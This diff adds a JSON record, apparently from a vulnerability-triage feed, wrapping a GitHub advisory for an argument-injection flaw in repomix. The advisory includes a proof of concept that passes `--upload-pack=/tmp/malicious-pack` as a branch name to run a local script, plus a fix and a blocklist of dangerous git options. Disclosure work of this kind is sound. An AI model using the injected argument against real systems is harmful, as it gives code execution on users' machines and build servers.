@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/194104974?v=4\", \"events_url\": \"https://api.github.com/users/kakashi-kx/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/kakashi-kx/followers\", \"following_url\": \"https://api.github.com/users/kakashi-kx/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/kakashi-kx/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/kakashi-kx\", \"id\": 194104974, \"login\": \"kakashi-kx\", \"node_id\": \"U_kgDOC5HOjg\", \"organizations_url\": \"https://api.github.com/users/kakashi-kx/orgs\", \"received_events_url\": \"https://api.github.com/users/kakashi-kx/received_events\", \"repos_url\": \"https://api.github.com/users/kakashi-kx/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/kakashi-kx/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/kakashi-kx/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/kakashi-kx\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-49987\", \"cvss\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 8.8, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-88\", \"name\": \"Improper Neutralization of Argument Delimiters in a Command ('Argument Injection')\"}], \"description\": \"### Vulnerability Metadata\\n\\n| Field | Detail |\\n| --- | --- |\\n| **Affected Component** | `src/core/git/gitCommand.ts` (`execGitShallowClone`) |\\n| **Impact** | Arbitrary Command Execution / Security Control Bypass |\\n\\n### Summary\\n\\nThe `--remote-branch` CLI option in `repomix` is vulnerable to argument injection. User-supplied input is passed directly to `git fetch` and `git checkout` subprocesses via `child_process.execFileAsync` without sanitization, `--` delimiters, or validation.\\n\\nAn attacker can inject arbitrary git command-line options. By injecting the `--upload-pack` option and specifying an SSH (`git@...`) or local (`file://`) remote URL, an attacker achieves arbitrary command execution with the privileges of the user running `repomix`. This bypasses the existing `dangerousParams` blocklist implemented in `validateGitUrl()`.\\n\\n### Vulnerable Code Analysis\\n\\n**File:** `src/core/git/gitCommand.ts`\\n\\nThe `remoteBranch` parameter is appended directly to the arguments array for git subprocesses without the `--` positional delimiter.\\n\\n**Sink 1 (Lines 118-127):**\\n\\n```typescript\\nawait deps.execFileAsync(\\n  'git',\\n  ['-C', directory, 'fetch', '--depth', '1', 'origin', remoteBranch], // Vulnerable\\n  gitRemoteOpts,\\n);\\n\\n```\\n\\n**Sink 2 (Lines 148-151):**\\n\\n```typescript\\nawait deps.execFileAsync('git', ['-C', directory, 'checkout', remoteBranch]); // Vulnerable\\n\\n```\\n\\n**Bypassed Security Control (Lines 192-197):**\\nThe application attempts to prevent this exact vulnerability class by blocking dangerous parameters (`--upload-pack`, `--receive-pack`, `--config`, `--exec`) within the `validateGitUrl` function. However, this validation is exclusively applied to the `url` variable and omitted for `remoteBranch`, creating a direct bypass.\\n\\n### Attack Flow\\n\\n```text\\n[Source] repomix --remote-branch <injected_option>\\n   ↓\\nsrc/cli/actions/remoteAction.ts:226 (cloneRepository)\\n   ↓\\nsrc/core/git/gitCommand.ts:118 (execGitShallowClone)\\n   ↓\\n[Sink] execFileAsync('git', ['...', 'origin', '--upload-pack=/tmp/payload'])\\n   ↓\\n[Execution] git invokes the payload binary via transport helper\\n\\n```\\n\\n### Proof of Concept (Steps to Reproduce)\\n\\n**1. Create the Payload**\\nCreate an executable bash script that writes system execution context to a file.\\n*(Reference: Screenshot_2026-05-18_13_02_16.png)*\\n\\n```bash\\ncat > /tmp/malicious-pack << 'EOF'\\n#!/bin/bash\\necho \\\"=== RCE EXECUTED ===\\\" > /tmp/repomix-pwned.txt\\nid >> /tmp/repomix-pwned.txt\\nEOF\\nchmod +x /tmp/malicious-pack\\n\\n```\\n\\n**2. Trigger the Vulnerability**\\nEstablish a dummy remote and trigger the fetch operation, injecting the `--upload-pack` argument.\\n*(Reference: Screenshot_2026-05-18_13_08_36.png)*\\n\\n```bash\\n# Setup dummy bare remote\\ngit init --bare /tmp/dummy-remote.git\\n\\n# Initialize local repo and add remote\\nmkdir /tmp/test-fetch && cd /tmp/test-fetch\\ngit init\\ngit remote add origin file:///tmp/dummy-remote.git\\n\\n# Execute vulnerability\\ngit fetch --upload-pack=/tmp/malicious-pack origin 2>&1\\n\\n```\\n\\n**3. Verify Execution**\\nExecution occurs prior to git protocol validation. The script executes successfully despite the fetch operation returning a `128` exit code.\\n\\n```bash\\ncat /tmp/repomix-pwned.txt\\n\\n```\\n\\n*Expected Output:*\\n\\n```text\\n=== RCE EXECUTED ===\\nuid=1000(kakashi) gid=1000(kakashi) groups=1000(kakashi)...\\n\\n```\\n\\n**End-to-End Execution via Repomix:**\\n\\n```bash\\nrepomix --remote git@github.com:yamadashy/repomix.git --remote-branch '--upload-pack=/tmp/malicious-pack'\\n\\n```\\n\\n### Impact\\n\\n* **Remote Code Execution:** Complete system compromise with the privileges of the user executing `repomix`.\\n* **CI/CD Compromise:** If `repomix` is utilized in automated pipelines where `--remote-branch` is populated by external triggers (e.g., webhook payloads, PR titles), attackers can compromise build servers and exfiltrate secrets.\\n\\n### Remediation\\n\\n**1. Implement Positional Delimiters (Primary Fix)**\\nAppend the `--` delimiter to explicitly separate options from positional arguments in all git subprocess calls utilizing `remoteBranch`.\\n\\n```typescript\\nawait deps.execFileAsync(\\n  'git',\\n  ['-C', directory, 'fetch', '--depth', '1', 'origin', '--', remoteBranch],\\n  gitRemoteOpts,\\n);\\n\\n```\\n\\n**2. Apply Existing Blocklist to Branch Parameter (Defense in Depth)**\\nUpdate `execGitShallowClone` to validate `remoteBranch` against the existing `dangerousParams` array.\\n\\n```typescript\\nconst dangerousParams = ['--upload-pack', '--receive-pack', '--config', '--exec'];\\n\\nif (remoteBranch && dangerousParams.some((param) => remoteBranch.includes(param))) {\\n  throw new RepomixError(`Invalid branch name. Contains potentially dangerous parameters: ${remoteBranch}`);\\n}\\n\\n```\\n\\n### Attachments \\n\\n**Screenshot 1:** Payload script created with executable permissions.\\n<img width=\\\"1920\\\" height=\\\"1080\\\" alt=\\\"Screenshot_2026-05-18_13_02_16\\\" src=\\\"https://github.com/user-attachments/assets/a0ada9de-c689-4ed8-9937-dd7faf6e6cc0\\\" />\\n\\n\\n**Screenshot 2:** Vulnerable Code \\n<img width=\\\"1920\\\" height=\\\"1080\\\" alt=\\\"Screenshot_2026-05-18_13_03_44\\\" src=\\\"https://github.com/user-attachments/assets/b72c7e05-d857-497a-9ae5-0822f86fa032\\\" />\\n\\n\\n**Screenshot 3:** Verifying RCE.\\n<img width=\\\"1920\\\" height=\\\"1080\\\" alt=\\\"Screenshot_2026-05-18_13_08_36\\\" src=\\\"https://github.com/user-attachments/assets/f153545e-e5e8-4165-ac1a-f84efbb1c135\\\" />\\n\\n\\n\\n\\n\\n---\\n\\n### Credits\\n\\nThis vulnerability was discovered and responsibly disclosed by:\\n- **Researcher:** Abhijith S.\\n- **GitHub:** [@kakashi-kx](https://github.com/kakashi-kx)\\n- **HackerOne/Bugcrowd:** [kakashi4kx](https://hackerone.com/kakashi4kx)\", \"epss\": {\"percentage\": 0.00697, \"percentile\": 0.48891}, \"ghsa_id\": \"GHSA-9mm9-rqhj-j5mx\", \"github_reviewed_at\": \"2026-07-01T19:00:50Z\", \"html_url\": \"https://github.com/advisories/GHSA-9mm9-rqhj-j5mx\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-9mm9-rqhj-j5mx\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-49987\"}], \"nvd_published_at\": null, \"published_at\": \"2026-07-01T19:00:50Z\", \"references\": [\"https://github.com/yamadashy/repomix/security/advisories/GHSA-9mm9-rqhj-j5mx\", \"https://github.com/advisories/GHSA-9mm9-rqhj-j5mx\"], \"repository_advisory_url\": \"https://api.github.com/repos/yamadashy/repomix/security-advisories/GHSA-9mm9-rqhj-j5mx\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/yamadashy/repomix\", \"summary\": \"repomix Vulnerable to Command Injection (RCE) via `--remote-branch` Argument Injection\", \"type\": \"reviewed\", \"updated_at\": \"2026-07-01T19:00:51Z\", \"url\": \"https://api.github.com/advisories/GHSA-9mm9-rqhj-j5mx\", \"vulnerabilities\": [{\"first_patched_version\": \"1.14.1\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"repomix\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"< 1.14.1\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-9mm9-rqhj-j5mx",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "repomix: < 1.14.1"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-49987"
+    ],
+    "cvss_score": 8.8,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "repomix"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:56.518240Z",
+  "provenance": {
+    "content_sha256": "80cff43f32fcabbbfb0ff2e8568c22c841db9b1551f16d278e2c36e44a0e260a",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-07-01T19:00:50Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-9mm9-rqhj-j5mx",
+  "status": "active",
+  "title": "repomix Vulnerable to Command Injection (RCE) via `--remote-branch` Argument Injection",
+  "updated_at": "2026-07-01T19:00:51Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-9mm9-rqhj-j5mx"
+}
